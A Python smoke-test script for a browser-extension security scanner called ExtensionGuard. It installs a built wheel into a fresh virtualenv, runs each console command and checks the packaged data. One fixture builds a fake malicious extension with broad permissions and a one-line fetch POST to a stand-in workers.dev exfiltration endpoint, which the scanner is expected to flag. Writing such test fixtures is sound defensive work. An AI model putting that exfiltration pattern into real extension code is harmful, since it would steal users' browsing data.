# tools/smoke_test.py - Install a built wheel into a fresh virtualenv and
# check that it actually works.
#
# The unit tests import the code from the source tree. This checks the thing
# users get: the wheel, installed from outside the repo, with its console
# scripts, templates and TTP library coming from site-packages. CI runs it on
# every PR; the release workflow runs it on the exact files it publishes.
#
# Usage:
#   python tools/smoke_test.py dist/extensionguard-0.4.0-py3-none-any.whl
#   python tools/smoke_test.py dist/*.whl --expect-version 0.4.0
#
# Exit code 0 = every check passed, 1 = something failed (listed).

import argparse
import io
import json
import os
import subprocess
import sys
import tempfile
import zipfile
from pathlib import Path

CONSOLE_SCRIPTS = [
    "extguard",
    "extguard-monitor",
    "extguard-dispatch",
    "extguard-remediate",
    "extguard-dashboard",
    "extguard-ttp-sync",
    "extguard-webhook",
    "extguard-sigma",
]

# A manifest with the TeamPCP permission shape plus an exfil endpoint in code
SAMPLE_MANIFEST = {
    "manifest_version": 3,
    "name": "Smoke Test",
    "version": "1.0.0",
    "permissions": ["cookies", "tabs", "storage", "debugger"],
    "host_permissions": ["<all_urls>"],
    "background": {"service_worker": "bg.js"},
}
SAMPLE_CODE = "fetch('https://x.workers.dev/c', {method: 'POST'});"

PACKAGE_DATA_CHECK = (
    "from extguard.dashboard import create_app\n"
    "from extguard.ttp_loader import load_ttp_library\n"
    "response = create_app().test_client().get('/')\n"
    "assert response.status_code == 200, response.status_code\n"
    "library = load_ttp_library()\n"
    "assert 'FALLBACK' not in library, 'packaged TTP library not found'\n"
)


def venv_paths(venv: Path) -> tuple:
    """(python executable, scripts directory) of a virtualenv on this OS."""
    if os.name == "nt":
        return venv / "Scripts" / "python.exe", venv / "Scripts"
    return venv / "bin" / "python", venv / "bin"


class SmokeTest:
    def __init__(self, wheel: Path, expect_version: str | None):
        self.wheel = wheel.resolve()
        self.expect_version = expect_version
        self.work = Path(tempfile.mkdtemp(prefix="extguard-smoke-"))
        self.python, self.scripts = venv_paths(self.work / "venv")
        # A clean data directory; no API keys or config from the caller
        self.env = dict(os.environ, EXTGUARD_HOME=str(self.work / "home"))
        for name in ("ANTHROPIC_API_KEY", "EXTGUARD_CONFIG", "VT_API_KEY"):
            self.env.pop(name, None)
        self.results = []

    def check(self, label: str, ok: bool, detail: str = ""):
        self.results.append((ok, label, detail))
        print(
            f"[{'PASS' if ok else 'FAIL'}] {label}" + (f" - {detail}" if detail and not ok else "")
        )

    def run(self, args: list) -> subprocess.CompletedProcess:
        # Run from the temp dir, so nothing is picked up from the source tree
        return subprocess.run(
            args, capture_output=True, text=True, env=self.env, cwd=self.work, timeout=300
        )

    def script(self, name: str) -> str:
        suffix = ".exe" if os.name == "nt" else ""
        return str(self.scripts / f"{name}{suffix}")

    # --- the checks ------------------------------------------------------

    def install(self) -> bool:
        created = self.run([sys.executable, "-m", "venv", str(self.work / "venv")])
        if created.returncode != 0:
            self.check("create virtualenv", False, created.stderr[-300:])
            return False
        installed = self.run([str(self.python), "-m", "pip", "install", "-q", str(self.wheel)])
        self.check("pip install the wheel", installed.returncode == 0, installed.stderr[-500:])
        return installed.returncode == 0

    def version(self):
        result = self.run([str(self.python), "-c", "import extguard; print(extguard.__version__)"])
        version = result.stdout.strip()
        if self.expect_version:
            self.check(
                f"installed version is {self.expect_version}",
                version == self.expect_version,
                f"got {version!r}",
            )
        else:
            self.check(f"installed version reported ({version})", bool(version), result.stderr)

    def console_scripts(self):
        for name in CONSOLE_SCRIPTS:
            result = self.run([self.script(name), "--help"])
            self.check(f"{name} --help", result.returncode == 0, result.stderr[-300:])

    def scan(self):
        buffer = io.BytesIO()
        with zipfile.ZipFile(buffer, "w") as archive:
            archive.writestr("manifest.json", json.dumps(SAMPLE_MANIFEST))
            archive.writestr("bg.js", SAMPLE_CODE)
        sample = self.work / "sample.zip"
        sample.write_bytes(buffer.getvalue())

        result = self.run(
            [
                self.script("extguard"),
                str(sample),
                "--json",
                "--no-ai",
                "--offline",
                "--fail-on",
                "high",
            ]
        )
        self.check("scan exits 1 for a HIGH/CRITICAL verdict", result.returncode == 1,
                   f"exit {result.returncode}: {result.stderr[-300:]}")  # fmt: skip
        try:
            report = json.loads(result.stdout)
        except ValueError:
            self.check("scan prints a JSON report", False, result.stdout[-300:])
            return
        self.check("scan verdict is high/critical", report.get("risk_level") in ("high", "critical"),
                   str(report.get("risk_level")))  # fmt: skip
        self.check(
            "report includes the Stage 1f code diff", "code" in report.get("stage_1_checks", {})
        )

    def other_commands(self):
        sigma = self.run([self.script("extguard-sigma"), "--output", str(self.work / "sigma")])
        rules = list((self.work / "sigma").glob("*.yml"))
        self.check("extguard-sigma writes rule files", sigma.returncode == 0 and len(rules) > 0)

        status = self.run([self.script("extguard-ttp-sync"), "--status"])
        self.check("extguard-ttp-sync --status", status.returncode == 0, status.stderr[-300:])

        dry_run = self.run(
            [self.script("extguard-remediate"), "--ext-id", "a" * 32, "--dry-run",
             "--pd-action", "none", "--no-playbook"]
        )  # fmt: skip
        self.check("extguard-remediate --dry-run", dry_run.returncode == 0, dry_run.stdout[-300:])

        webhook = self.run([self.script("extguard-webhook")])
        self.check("extguard-webhook refuses to start without a secret", webhook.returncode == 2)

    def package_data(self):
        result = self.run([str(self.python), "-c", PACKAGE_DATA_CHECK])
        self.check(
            "dashboard templates + TTP library load from site-packages",
            result.returncode == 0,
            result.stderr[-500:],
        )

    def run_all(self) -> int:
        print(f"Smoke-testing {self.wheel.name} in {self.work}")
        if self.install():
            self.version()
            self.console_scripts()
            self.scan()
            self.other_commands()
            self.package_data()
        failed = [label for ok, label, _ in self.results if not ok]
        print(f"{len(self.results) - len(failed)}/{len(self.results)} checks passed")
        return 1 if failed else 0


def main(argv: list | None = None) -> int:
    parser = argparse.ArgumentParser(description="Smoke-test a built ExtensionGuard wheel")
    parser.add_argument("wheel", type=Path, help="Path to the .whl file")
    parser.add_argument("--expect-version", help="Fail unless the installed version is this")
    args = parser.parse_args(argv)
    if not args.wheel.is_file():
        print(f"No such wheel: {args.wheel}")
        return 1
    return SmokeTest(args.wheel, args.expect_version).run_all()


if __name__ == "__main__":
    sys.exit(main())
